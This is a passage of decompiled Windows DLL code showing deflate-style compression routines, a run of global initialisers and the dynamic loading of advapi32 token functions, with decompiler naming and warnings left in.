    *(ushort *)(iVar1 + 0x16b8) = *(ushort *)(iVar1 + 0x16b8) | (ushort)(2 << ((byte)iVar2 & 0x1f));
    if (iVar2 < 0xe) {
      *(int *)(iVar1 + 0x16bc) = iVar2 + 3;
    }
    else {
      *(undefined1 *)(*(int *)(iVar1 + 8) + *(int *)(iVar1 + 0x14)) =
           *(undefined1 *)(iVar1 + 0x16b8);
      *(int *)(iVar1 + 0x14) = *(int *)(iVar1 + 0x14) + 1;
      *(undefined1 *)(*(int *)(iVar1 + 0x14) + *(int *)(iVar1 + 8)) =
           *(undefined1 *)(iVar1 + 0x16b9);
      iVar2 = *(int *)(iVar1 + 0x16bc);
      *(int *)(iVar1 + 0x14) = *(int *)(iVar1 + 0x14) + 1;
      *(int *)(iVar1 + 0x16bc) = iVar2 + -0xd;
      *(ushort *)(iVar1 + 0x16b8) = 2 >> (0x10U - (char)iVar2 & 0x1f);
    }
    iVar2 = *(int *)(iVar1 + 0x16bc);
    *(ushort *)(iVar1 + 0x16b8) = *(ushort *)(iVar1 + 0x16b8) | (ushort)(0 << ((byte)iVar2 & 0x1f));
    if (9 < iVar2) {
      *(undefined1 *)(*(int *)(iVar1 + 8) + *(int *)(iVar1 + 0x14)) =
           *(undefined1 *)(iVar1 + 0x16b8);
      *(int *)(iVar1 + 0x14) = *(int *)(iVar1 + 0x14) + 1;
      *(undefined1 *)(*(int *)(iVar1 + 0x14) + *(int *)(iVar1 + 8)) =
           *(undefined1 *)(iVar1 + 0x16b9);
      iVar2 = *(int *)(iVar1 + 0x16bc);
      *(int *)(iVar1 + 0x14) = *(int *)(iVar1 + 0x14) + 1;
      *(int *)(iVar1 + 0x16bc) = iVar2 + -9;
      *(ushort *)(iVar1 + 0x16b8) = 0 >> (0x10U - (char)iVar2 & 0x1f);
      iVar2 = FUN_10003e60();
      *(undefined4 *)(iVar2 + 0x16b4) = 7;
      return;
    }
    *(int *)(iVar1 + 0x16bc) = iVar2 + 7;
    iVar1 = FUN_10003e60();
  }
  *(undefined4 *)(iVar1 + 0x16b4) = 7;
  return;
}



/* Function: FUN_10004640 */

void FUN_10004640(int *param_1,int param_2,int param_3,int param_4)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  int local_4;
  
  local_4 = 0;
  if (param_1[0x21] < 1) {
    uVar3 = param_3 + 5;
  }
  else {
    if ((param_3 != 0) && (*(int *)(*param_1 + 0x2c) == 2)) {
      FUN_10003d90();
    }
    FUN_100040e0(param_1 + 0x2c6);
    FUN_100040e0(param_1 + 0x2c9);
    local_4 = FUN_100042e0();
    uVar4 = param_1[0x5aa] + 10U >> 3;
    uVar3 = param_1[0x5ab] + 10U >> 3;
    if (uVar4 < uVar3) goto LAB_100046b9;
  }
  uVar4 = uVar3;
LAB_100046b9:
  if ((uVar4 < param_3 + 4U) || (param_2 == 0)) {
    if ((param_1[0x22] == 4) || (uVar3 == uVar4)) {
      iVar2 = param_1[0x5af];
      iVar1 = param_4 + 2;
      if (iVar2 < 0xe) {
        *(ushort *)(param_1 + 0x5ae) =
             *(ushort *)(param_1 + 0x5ae) | (ushort)(iVar1 << ((byte)iVar2 & 0x1f));
        param_1[0x5af] = iVar2 + 3;
      }
      else {
        *(ushort *)(param_1 + 0x5ae) =
             *(ushort *)(param_1 + 0x5ae) | (ushort)(iVar1 << ((byte)iVar2 & 0x1f));
        *(char *)(param_1[2] + param_1[5]) = (char)param_1[0x5ae];
        param_1[5] = param_1[5] + 1;
        *(undefined1 *)(param_1[5] + param_1[2]) = *(undefined1 *)((int)param_1 + 0x16b9);
        iVar2 = param_1[0x5af];
        param_1[5] = param_1[5] + 1;
        param_1[0x5af] = iVar2 + -0xd;
        *(ushort *)(param_1 + 0x5ae) = (ushort)iVar1 >> (0x10U - (char)iVar2 & 0x1f);
      }
      FUN_10003980(&DAT_10082618,&DAT_10082a98);
    }
    else {
      iVar2 = param_1[0x5af];
      iVar1 = param_4 + 4;
      if (iVar2 < 0xe) {
        *(ushort *)(param_1 + 0x5ae) =
             *(ushort *)(param_1 + 0x5ae) | (ushort)(iVar1 << ((byte)iVar2 & 0x1f));
        param_1[0x5af] = iVar2 + 3;
      }
      else {
        *(ushort *)(param_1 + 0x5ae) =
             *(ushort *)(param_1 + 0x5ae) | (ushort)(iVar1 << ((byte)iVar2 & 0x1f));
        *(char *)(param_1[2] + param_1[5]) = (char)param_1[0x5ae];
        param_1[5] = param_1[5] + 1;
        *(undefined1 *)(param_1[5] + param_1[2]) = *(undefined1 *)((int)param_1 + 0x16b9);
        iVar2 = param_1[0x5af];
        param_1[5] = param_1[5] + 1;
        param_1[0x5af] = iVar2 + -0xd;
        *(ushort *)(param_1 + 0x5ae) = (ushort)iVar1 >> (0x10U - (char)iVar2 & 0x1f);
      }
      FUN_10003720(param_1[0x2c7] + 1,param_1[0x2ca] + 1,local_4 + 1);
      FUN_10003980(param_1 + 0x25,param_1 + 0x262);
    }
  }
  else {
    FUN_100043b0(param_1,param_2,param_3,param_4);
  }
  FUN_10002dc0();
  if (param_4 == 0) {
    return;
  }
  FUN_10003ee0();
  return;
}



/* Function: FUN_100048a0 */

uint FUN_100048a0(int param_1,uint param_2)

{
  short sVar1;
  int iVar2;
  short sVar3;
  int iVar4;
  uint uVar5;
  int iVar6;
  int iVar7;
  short sVar8;
  uint uVar9;
  int iVar10;
  uint uVar11;
  short *psVar12;
  uint uVar13;
  uint *puVar14;
  uint *puVar15;
  uint *puVar16;
  uint *puVar17;
  bool bVar18;
  uint local_40;
  int local_3c;
  int local_2c;
  uint local_1c;
  uint local_18;
  uint local_14;
  
  if ((DAT_100965fc == 0) && (*(int *)(param_1 + 0x34) == 0x7fff)) {
    local_14 = *(uint *)(param_1 + 0x7c);
    local_1c = *(uint *)(param_1 + 0x78);
    if (*(uint *)(param_1 + 0x8c) <= local_1c) {
      local_14 = local_14 >> 2;
    }
    local_14 = local_14 + 1;
    uVar9 = *(uint *)(param_1 + 0x90);
    if (*(uint *)(param_1 + 0x74) < *(uint *)(param_1 + 0x90)) {
      uVar9 = *(uint *)(param_1 + 0x74);
    }
    iVar10 = *(int *)(param_1 + 0x38);
    uVar11 = *(uint *)(param_1 + 0x6c);
    psVar12 = (short *)(iVar10 + uVar11);
    sVar1 = *psVar12;
    sVar8 = *(short *)((local_1c - 1) + (int)psVar12);
    uVar13 = *(int *)(param_1 + 0x2c) - 0x106;
    uVar5 = uVar11 - uVar13;
    if (uVar11 < uVar13 || uVar5 == 0) {
      uVar5 = 0;
    }
    iVar2 = *(int *)(param_1 + 0x40);
    local_40 = *(uint *)(param_1 + 0x70);
    local_3c = iVar10 + local_1c + -1;
    do {
      uVar11 = local_14 - 0x11;
      bVar18 = 0x10 < local_14;
      local_14 = uVar11;
      if (bVar18) {
        do {
          if ((*(short *)(param_2 + local_3c) == sVar8) && (sVar1 == *(short *)(param_2 + iVar10)))
          {
            local_14 = local_14 + 0x10;
            goto LAB_10005435;
          }
          param_2 = (uint)*(ushort *)(iVar2 + (param_2 & 0x7fff) * 2);
          if (param_2 <= uVar5) goto LAB_100054e8;
          if ((*(short *)(param_2 + local_3c) == sVar8) && (sVar1 == *(short *)(param_2 + iVar10)))
          {
            local_14 = local_14 + 0xf;
            goto LAB_10005435;
          }
          param_2 = (uint)*(ushort *)(iVar2 + (param_2 & 0x7fff) * 2);
          if (param_2 <= uVar5) goto LAB_100054e8;
          if ((*(short *)(param_2 + local_3c) == sVar8) && (sVar1 == *(short *)(param_2 + iVar10)))
          {
            local_14 = local_14 + 0xe;
            goto LAB_10005435;
          }
          param_2 = (uint)*(ushort *)(iVar2 + (param_2 & 0x7fff) * 2);
          if (param_2 <= uVar5) goto LAB_100054e8;
          if ((*(short *)(param_2 + local_3c) == sVar8) && (sVar1 == *(short *)(param_2 + iVar10)))
          {
            local_14 = local_14 + 0xd;
            goto LAB_10005435;
          }
          param_2 = (uint)*(ushort *)(iVar2 + (param_2 & 0x7fff) * 2);
          if (param_2 <= uVar5) goto LAB_100054e8;
          if ((*(short *)(param_2 + local_3c) == sVar8) && (sVar1 == *(short *)(param_2 + iVar10)))
          {
            local_14 = local_14 + 0xc;
            goto LAB_10005435;
          }
          param_2 = (uint)*(ushort *)(iVar2 + (param_2 & 0x7fff) * 2);
          if (param_2 <= uVar5) goto LAB_100054e8;
          if ((*(short *)(param_2 + local_3c) == sVar8) && (sVar1 == *(short *)(param_2 + iVar10)))
          {
            local_14 = local_14 + 0xb;
            goto LAB_10005435;
          }
          param_2 = (uint)*(ushort *)(iVar2 + (param_2 & 0x7fff) * 2);
          if (param_2 <= uVar5) goto LAB_100054e8;
          if ((*(short *)(param_2 + local_3c) == sVar8) && (sVar1 == *(short *)(param_2 + iVar10)))
          {
            local_14 = local_14 + 10;
            goto LAB_10005435;
          }
          param_2 = (uint)*(ushort *)(iVar2 + (param_2 & 0x7fff) * 2);
          if (param_2 <= uVar5) goto LAB_100054e8;
          if ((*(short *)(param_2 + local_3c) == sVar8) && (sVar1 == *(short *)(param_2 + iVar10)))
          {
            local_14 = local_14 + 9;
            goto LAB_10005435;
          }
          param_2 = (uint)*(ushort *)(iVar2 + (param_2 & 0x7fff) * 2);
          if (param_2 <= uVar5) goto LAB_100054e8;
          if ((*(short *)(param_2 + local_3c) == sVar8) && (sVar1 == *(short *)(param_2 + iVar10)))
          {
            local_14 = local_14 + 8;
            goto LAB_10005435;
          }
          param_2 = (uint)*(ushort *)(iVar2 + (param_2 & 0x7fff) * 2);
          if (param_2 <= uVar5) goto LAB_100054e8;
          if ((*(short *)(param_2 + local_3c) == sVar8) && (sVar1 == *(short *)(param_2 + iVar10)))
          {
            local_14 = local_14 + 7;
            goto LAB_10005435;
          }
          param_2 = (uint)*(ushort *)(iVar2 + (param_2 & 0x7fff) * 2);
          if (param_2 <= uVar5) goto LAB_100054e8;
          if ((*(short *)(param_2 + local_3c) == sVar8) && (sVar1 == *(short *)(param_2 + iVar10)))
          {
            local_14 = local_14 + 6;
            goto LAB_10005435;
          }
          param_2 = (uint)*(ushort *)(iVar2 + (param_2 & 0x7fff) * 2);
          if (param_2 <= uVar5) goto LAB_100054e8;
          if ((*(short *)(param_2 + local_3c) == sVar8) && (sVar1 == *(short *)(param_2 + iVar10)))
          {
            local_14 = local_14 + 5;
            goto LAB_10005435;
          }
          param_2 = (uint)*(ushort *)(iVar2 + (param_2 & 0x7fff) * 2);
          if (param_2 <= uVar5) goto LAB_100054e8;
          if ((*(short *)(param_2 + local_3c) == sVar8) && (sVar1 == *(short *)(param_2 + iVar10)))
          {
            local_14 = local_14 + 4;
            goto LAB_10005435;
          }
          param_2 = (uint)*(ushort *)(iVar2 + (param_2 & 0x7fff) * 2);
          if (param_2 <= uVar5) goto LAB_100054e8;
          if ((*(short *)(param_2 + local_3c) == sVar8) && (sVar1 == *(short *)(param_2 + iVar10)))
          {
            local_14 = local_14 + 3;
            goto LAB_10005435;
          }
          param_2 = (uint)*(ushort *)(iVar2 + (param_2 & 0x7fff) * 2);
          if (param_2 <= uVar5) goto LAB_100054e8;
          if ((*(short *)(param_2 + local_3c) == sVar8) && (sVar1 == *(short *)(param_2 + iVar10)))
          {
            local_14 = local_14 + 2;
            goto LAB_10005435;
          }
          param_2 = (uint)*(ushort *)(iVar2 + (param_2 & 0x7fff) * 2);
          if (param_2 <= uVar5) goto LAB_100054e8;
          if ((*(short *)(param_2 + local_3c) == sVar8) && (sVar1 == *(short *)(param_2 + iVar10)))
          {
            local_14 = local_14 + 1;
            goto LAB_10005435;
          }
          param_2 = (uint)*(ushort *)(iVar2 + (param_2 & 0x7fff) * 2);
          if (param_2 <= uVar5) goto LAB_100054e8;
          uVar11 = local_14 - 0x10;
          bVar18 = 0xf < local_14;
          local_14 = uVar11;
        } while (bVar18);
      }
      local_14 = local_14 + 0x10;
      while( true ) {
        if (local_14 == 0) goto LAB_100054e8;
        if ((*(short *)(param_2 + local_3c) == sVar8) && (sVar1 == *(short *)(param_2 + iVar10)))
        break;
        param_2 = (uint)*(ushort *)(iVar2 + (param_2 & 0x7fff) * 2);
        if (param_2 <= uVar5) goto LAB_100054e8;
        local_14 = local_14 - 1;
      }
      if (sVar1 == *(short *)(param_2 + iVar10)) {
LAB_10005435:
        uVar11 = *(uint *)((int)psVar12 + 3) ^ *(uint *)(iVar10 + param_2 + 3);
        if (uVar11 == 0) {
          bVar18 = (uint *)(psVar12 + 3) == (uint *)0x0;
          iVar6 = 0x3f;
          puVar15 = (uint *)(psVar12 + 3);
          puVar16 = (uint *)(iVar10 + param_2 + 6);
          do {
            puVar14 = puVar15;
            puVar17 = puVar16;
            if (iVar6 == 0) break;
            iVar6 = iVar6 + -1;
            puVar17 = puVar16 + 1;
            puVar14 = puVar15 + 1;
            bVar18 = *puVar15 == *puVar16;
            puVar15 = puVar14;
            puVar16 = puVar17;
          } while (bVar18);
          puVar15 = puVar14;
          if (!bVar18) {
            puVar15 = puVar14 + -1;
            uVar11 = puVar17[-1] ^ *puVar15;
            if ((((char)uVar11 == '\0') &&
                (puVar15 = (uint *)((int)puVar14 + -3), (short)uVar11 == 0)) &&
               (puVar15 = (uint *)((int)puVar14 + -2), (uVar11 & 0xffffff) == 0)) {
              puVar15 = (uint *)((int)puVar14 + -1);
            }
          }
          uVar11 = (int)puVar15 - (int)psVar12;
        }
        else if ((char)uVar11 == '\0') {
          if ((short)uVar11 == 0) {
            if ((uVar11 & 0xffffff) == 0) {
              uVar11 = 6;
            }
            else {
              uVar11 = 5;
            }
          }
          else {
            uVar11 = 4;
          }
        }
        else {
          uVar11 = 3;
        }
        if (local_1c < uVar11) {
          local_40 = param_2;
          local_1c = uVar11;
          if (uVar9 <= uVar11) break;
          local_3c = uVar11 + iVar10 + -1;
          sVar8 = *(short *)((int)psVar12 + (uVar11 - 1));
        }
      }
      param_2 = (uint)*(ushort *)(iVar2 + (param_2 & 0x7fff) * 2);
    } while (uVar5 < param_2);
LAB_100054e8:
    *(uint *)(param_1 + 0x70) = local_40;
    uVar9 = *(uint *)(param_1 + 0x74);
    if (local_1c <= *(uint *)(param_1 + 0x74)) {
      uVar9 = local_1c;
    }
    return uVar9;
  }
  uVar9 = *(uint *)(param_1 + 0x7c);
  if (*(int *)(param_1 + 0x8c) <= *(int *)(param_1 + 0x78)) {
    uVar9 = uVar9 >> 2;
  }
  uVar9 = (uVar9 - 1) * 0x10000 | *(uint *)(param_1 + 0x34);
  iVar10 = *(int *)(param_1 + 0x74);
  if (*(int *)(param_1 + 0x90) <= *(int *)(param_1 + 0x74)) {
    iVar10 = *(int *)(param_1 + 0x90);
  }
  iVar2 = *(int *)(param_1 + 0x38);
  iVar6 = *(int *)(param_1 + 0x6c);
  psVar12 = (short *)(iVar6 + iVar2);
  iVar4 = *(int *)(param_1 + 0x2c) + -0x106;
  uVar11 = iVar6 - iVar4;
  if (uVar11 == 0 || iVar6 < iVar4) {
    uVar11 = 0;
  }
  local_18 = *(uint *)(param_1 + 0x78);
  iVar4 = iVar2 + local_18;
  sVar1 = *psVar12;
  sVar8 = *(short *)((local_18 - 1) + (int)psVar12);
  iVar6 = *(int *)(param_1 + 0x40);
  local_2c = iVar4;
  sVar3 = sVar8;
  do {
    if ((*(short *)((param_2 - 1) + iVar4) == sVar8) && (*(short *)(param_2 + iVar2) == sVar1)) {
      iVar7 = -0x108;
      iVar6 = (-(int)psVar12 & 3U) + 0x108;
      iVar4 = (-(int)psVar12 & 3U) + 0x108 + iVar2 + param_2;
      while (uVar5 = *(uint *)(iVar7 + iVar4) ^ *(uint *)((int)psVar12 + iVar7 + iVar6), uVar5 == 0)
      {
        uVar5 = *(uint *)(iVar7 + 4 + iVar4) ^ *(uint *)((int)psVar12 + iVar7 + 4 + iVar6);
        if (uVar5 != 0) {
          iVar7 = iVar7 + 4;
          break;
        }
        iVar7 = iVar7 + 8;
        if (iVar7 == 0) goto LAB_100056fb;
      }
      if ((uVar5 & 0xffff) == 0) {
        iVar7 = iVar7 + 2;
        uVar5 = uVar5 >> 0x10;
      }
      uVar5 = iVar7 + (uint)((char)uVar5 == '\0') + iVar6;
      if (0x101 < (int)uVar5) {
LAB_100056fb:
        local_18 = 0x102;
        *(uint *)(param_1 + 0x70) = param_2;
LAB_1000570a:
        uVar9 = *(uint *)(param_1 + 0x74);
        if ((int)local_18 <= (int)*(uint *)(param_1 + 0x74)) {
          uVar9 = local_18;
        }
        return uVar9;
      }
      if ((int)local_18 < (int)uVar5) {
        *(uint *)(param_1 + 0x70) = param_2;
        local_18 = uVar5;
        if (iVar10 <= (int)uVar5) goto LAB_1000570a;
        iVar4 = iVar2 + uVar5;
        sVar8 = *(short *)((uVar5 - 1) + (int)psVar12);
        iVar6 = *(int *)(param_1 + 0x40);
        local_2c = iVar4;
        sVar3 = sVar8;
      }
      else {
        iVar6 = *(int *)(param_1 + 0x40);
        iVar4 = local_2c;
        sVar8 = sVar3;
      }
    }
    param_2 = (uint)*(ushort *)(iVar6 + (param_2 & uVar9) * 2);
    if ((param_2 <= uVar11) || (uVar9 = uVar9 - 0x10000, (int)uVar9 < 0)) goto LAB_1000570a;
  } while( true );
}



/* Function: FUN_100057a0 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_100057a0(void)

{
  _DAT_1009b060 = 8;
  _DAT_1009b068 = 0;
  return;
}



/* Function: FUN_100057d0 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_100057d0(void)

{
  _DAT_1009b06c = 8;
  _DAT_1009b074 = 0;
  return;
}



/* Function: FUN_10005800 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_10005800(void)

{
  _DAT_1009b078 = 8;
  _DAT_1009b080 = 0;
  return;
}



/* Function: FUN_10005830 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_10005830(void)

{
  _DAT_1009b084 = 8;
  _DAT_1009b08c = 0;
  return;
}



/* Function: FUN_10005860 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_10005860(void)

{
  _DAT_1009b090 = 8;
  _DAT_1009b098 = 0;
  return;
}



/* Function: FUN_10005890 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_10005890(void)

{
  _DAT_1009b09c = 8;
  _DAT_1009b0a4 = 0;
  return;
}



/* Function: FUN_100058c0 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_100058c0(void)

{
  _DAT_1009b0a8 = 8;
  _DAT_1009b0b0 = 0;
  return;
}



/* Function: FUN_100058f0 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_100058f0(void)

{
  _DAT_1009b0b4 = 8;
  _DAT_1009b0bc = 0;
  return;
}



/* Function: FUN_10005920 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_10005920(void)

{
  _DAT_1009b0c0 = 8;
  _DAT_1009b0c8 = 0;
  return;
}



/* Function: FUN_10005950 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_10005950(void)

{
  _DAT_1009b0cc = 8;
  _DAT_1009b0d4 = 0;
  return;
}



/* Function: FUN_10005980 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_10005980(void)

{
  _DAT_1009b0d8 = 8;
  _DAT_1009b0e0 = 0;
  return;
}



/* Function: FUN_100059b0 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_100059b0(void)

{
  _DAT_1009b0e4 = 8;
  _DAT_1009b0ec = 0;
  return;
}



/* Function: FUN_100059e0 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_100059e0(void)

{
  _DAT_1009b0f0 = 8;
  _DAT_1009b0f8 = 0;
  return;
}



/* Function: FUN_10005a10 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_10005a10(void)

{
  _DAT_1009b0fc = 8;
  _DAT_1009b104 = 0;
  return;
}



/* Function: FUN_10005a40 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_10005a40(void)

{
  _DAT_1009b108 = 8;
  _DAT_1009b110 = 0;
  return;
}



/* Function: FUN_10005a70 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_10005a70(void)

{
  _DAT_1009b114 = 8;
  _DAT_1009b11c = 0;
  return;
}



/* Function: FUN_10005aa0 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_10005aa0(void)

{
  _DAT_1009b120 = 8;
  _DAT_1009b128 = 0;
  return;
}



/* Function: FUN_10005ad0 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_10005ad0(void)

{
  _DAT_1009b12c = 8;
  _DAT_1009b134 = 0;
  return;
}



/* Function: FUN_10005b00 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_10005b00(void)

{
  _DAT_1009b138 = 8;
  _DAT_1009b140 = 0;
  return;
}



/* Function: FUN_10005b30 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_10005b30(void)

{
  _DAT_1009b144 = 8;
  _DAT_1009b14c = 0;
  return;
}



/* Function: FUN_10005b60 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_10005b60(void)

{
  _DAT_1009b150 = 8;
  _DAT_1009b158 = 0;
  return;
}



/* Function: FUN_10005b90 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_10005b90(void)

{
  _DAT_1009b15c = 8;
  _DAT_1009b164 = 0;
  return;
}



/* Function: FUN_10005bc0 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_10005bc0(void)

{
  _DAT_1009b168 = 8;
  _DAT_1009b170 = 0;
  return;
}



/* Function: FUN_10005bf0 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_10005bf0(void)

{
  _DAT_1009b174 = 8;
  _DAT_1009b17c = 0;
  return;
}



/* Function: FUN_10005c20 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_10005c20(void)

{
  _DAT_1009b180 = 8;
  _DAT_1009b188 = 0;
  return;
}



/* Function: FUN_10005c50 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_10005c50(void)

{
  _DAT_1009b18c = 8;
  _DAT_1009b194 = 0;
  return;
}



/* Function: FUN_10005c80 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_10005c80(void)

{
  _DAT_1009b198 = 8;
  _DAT_1009b1a0 = 0;
  return;
}



/* Function: FUN_10005cb0 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_10005cb0(void)

{
  _DAT_1009b1a4 = 8;
  _DAT_1009b1ac = 0;
  return;
}



/* Function: FUN_10005ce0 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_10005ce0(void)

{
  _DAT_1009b1b0 = 8;
  _DAT_1009b1b8 = 0;
  return;
}



/* Function: FUN_10005d10 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_10005d10(void)

{
  _DAT_1009b1bc = 8;
  _DAT_1009b1c4 = 0;
  return;
}



/* Function: FUN_10005d40 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_10005d40(void)

{
  _DAT_1009b1c8 = 8;
  _DAT_1009b1d0 = 0;
  return;
}



/* Function: FUN_10005e00 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_10005e00(void)

{
  _DAT_1009abb0 = 0;
  _DAT_1009abb8 = 0xffffffff;
  return;
}



/* Function: FUN_10006130 */

void __fastcall FUN_10006130(undefined4 param_1)

{
  FUN_104cf370(param_1,0);
  return;
}



/* Function: FUN_10006160 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_10006160(void)

{
  DAT_1009b1e0 = 0;
  _DAT_1009b1f0 = 0;
  uRam1009b1f4 = 0;
  uRam1009b1f8 = 0;
  uRam1009b1fc = 0;
  _DAT_1009b200 = 0;
  _DAT_1009b1e4 = 0x10000000;
  DAT_1009b1e8 = &DAT_100930e8;
  DAT_1009b1ec = &DAT_100930e8;
  FUN_100d4646(&DAT_1009b1f0,0);
  return;
}



/* Function: FUN_100061e0 */

void FUN_100061e0(void)

{
  int *piVar1;
  int *piVar2;
  int *piVar3;
  
  if (DAT_1009b1e0 == 0) {
    return;
  }
  piVar2 = DAT_1009b1ec;
  piVar3 = DAT_1009b1e8;
  if (DAT_1009b1e8 < DAT_1009b1ec) {
    do {
      if ((*piVar3 != 0) && (piVar1 = *(int **)(*piVar3 + 0x10), *piVar1 != 0)) {
        piVar2 = (int *)FUN_106818c9();
        (**(code **)(*piVar2 + 8))(piVar2);
        *piVar1 = 0;
        piVar2 = DAT_1009b1ec;
      }
      piVar3 = piVar3 + 1;
    } while (piVar3 < piVar2);
  }
  FUN_10486b84(&DAT_1009b1f0);
  return;
}



/* Function: FUN_10006250 */

void FUN_10006250(void)

{
  return;
}



/* Function: FUN_10006260 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined4 * __fastcall FUN_10006260(undefined4 param_1)

{
  int iVar1;
  undefined4 *puVar2;
  
  DAT_1009b230 = 0;
  _DAT_1009b214 = 0;
  uRam1009b218 = 0;
  uRam1009b21c = 0;
  uRam1009b220 = 0;
  DAT_1009b234 = 0;
  _DAT_1009b224 = 0;
  _DAT_1009b238 = 0;
  DAT_1009b210 = 0x2c;
  DAT_1009b22c = 0;
  iVar1 = FUN_10558a9e(param_1,&DAT_1009b214,0);
  if (iVar1 == 0) {
    puVar2 = (undefined4 *)FUN_104599f7();
    return puVar2;
  }
  return &DAT_1009b210;
}



/* Function: FUN_100062f0 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined4 __fastcall FUN_100062f0(undefined4 param_1,undefined4 param_2)

{
  undefined4 uVar1;
  
  if (DAT_1009b210 == 0) {
    return 0;
  }
  if (DAT_1009b210 != 0x2c) {
    return 0x80070057;
  }
  if (0 < DAT_1009b234) {
    uVar1 = FUN_10181d1b();
    return uVar1;
  }
  if (DAT_1009b230 != 0) {
    FUN_100579ee(DAT_1009b230,param_2);
    DAT_1009b230 = 0;
  }
  DAT_1009b234 = 0;
  _DAT_1009b238 = 0;
  uVar1 = FUN_1029a264(&DAT_1009b214);
  return uVar1;
}



/* Function: FUN_100063b0 */

uint FUN_100063b0(void)

{
  undefined4 uVar1;
  int iVar2;
  int *piVar3;
  undefined4 extraout_ECX;
  uint unaff_EBX;
  uint uVar4;
  code *unaff_EDI;
  undefined4 local_c;
  undefined4 local_8;
  
  uVar4 = unaff_EBX & 0xffffff00;
  if ((DAT_10099158 & 1) == 0) {
    DAT_10099158 = DAT_10099158 | 1;
    FUN_100064d0();
    FUN_10057b51(&LAB_10078190);
  }
  if ((DAT_10099120 != (code *)0x0) && (DAT_100990dc != (code *)0x0)) {
    uVar1 = (*DAT_10079264)();
    iVar2 = (*DAT_100990dc)(uVar1,8,&local_c);
    if (iVar2 != 0) {
      FUN_105049b3(uVar4);
      (*unaff_EDI)(0);
      iVar2 = (*DAT_10099120)(local_c,0x1d,0,0,&local_8);
      if (iVar2 == 0) {
        iVar2 = FUN_10106857(uVar4);
        (*unaff_EDI)(0);
        if ((iVar2 == 0x7a) &&
           (piVar3 = (int *)FUN_1063819a(extraout_ECX,0,local_8), piVar3 != (int *)0x0)) {
          (*unaff_EDI)(0);
          iVar2 = (*DAT_10099120)(local_c,0x1d,piVar3,local_8,&local_8);
          if ((iVar2 != 0) && (uVar4 = 0, *piVar3 != 0)) {
            uVar4 = 1;
          }
          (*DAT_10079288)(piVar3);
        }
      }
      (*DAT_10079270)(local_c);
    }
    return uVar4 & 0xff;
  }
  return 0;
}



/* Function: FUN_100064a0 */

undefined4 * FUN_100064a0(void)

{
  if ((DAT_10099158 & 1) == 0) {
    DAT_10099158 = DAT_10099158 | 1;
    FUN_100064d0();
    FUN_10057b51(&LAB_10078190);
  }
  return &DAT_100990d8;
}



/* Function: FUN_100064d0 */

/* WARNING: Instruction at (ram,0x1000666d) overlaps instruction at (ram,0x1000666a)
    */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined4 * FUN_100064d0(void)

{
  code *unaff_ESI;
  undefined1 in_ZF;
  undefined8 uVar1;
  
  DAT_100990d8 = 0;
  DAT_100990dc = 0;
  DAT_100990e0 = 0;
  DAT_100990e4 = 0;
  DAT_100990e8 = 0;
  DAT_100990ec = 0;
  DAT_100990f0 = 0;
  DAT_100990f4 = 0;
  DAT_100990f8 = 0;
  DAT_100990fc = 0;
  DAT_10099100 = 0;
  _DAT_10099104 = 0;
  _DAT_10099108 = 0;
  DAT_1009910c = 0;
  _DAT_10099110 = 0;
  _DAT_10099114 = 0;
  DAT_10099118 = 0;
  DAT_1009911c = 0;
  DAT_10099120 = 0;
  DAT_10099124 = 0;
  DAT_10099128 = 0;
  _DAT_1009912c = 0;
  DAT_10099130 = 0;
  DAT_10099134 = 0;
  DAT_10099138 = 0;
  DAT_1009913c = 0;
  _DAT_10099140 = 0;
  _DAT_10099144 = 0;
  _DAT_10099148 = 0;
  DAT_1009914c = 0;
  DAT_10099150 = 0;
  DAT_10099154 = 0;
  uVar1 = FUN_103ab259("advapi32.dll");
  if ((bool)in_ZF) {
    *(uint *)uVar1 = *(uint *)uVar1 | (uint)((ulonglong)uVar1 >> 0x20);
  }
  DAT_100990d8 = FUN_1027121b();
  DAT_100990dc = (*unaff_ESI)(DAT_100990d8,"OpenProcessToken");
  DAT_100990e0 = (*unaff_ESI)(DAT_100990d8,"OpenThreadToken");
  DAT_100990e4 = (*unaff_ESI)(DAT_100990d8,"AllocateAndInitializeSid");
